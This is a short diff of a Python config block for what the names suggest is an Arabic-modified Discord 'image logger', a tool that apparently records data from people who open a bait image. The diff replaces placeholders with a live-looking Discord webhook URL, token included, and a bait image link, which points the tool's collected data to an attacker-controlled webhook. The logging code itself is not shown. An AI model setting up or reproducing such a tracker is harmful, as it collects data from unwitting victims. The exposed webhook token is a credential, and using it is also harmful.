@@ -11,8 +11,8 @@ __version__ = "v2.0 عربي معدل"
 __author__ = "كولن"
 
 config = {
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !",
+    "webhook": "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C",
+    "image": "https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg",
     "imageArgument": True,
 
     "username": "مسجل الصور العربي",
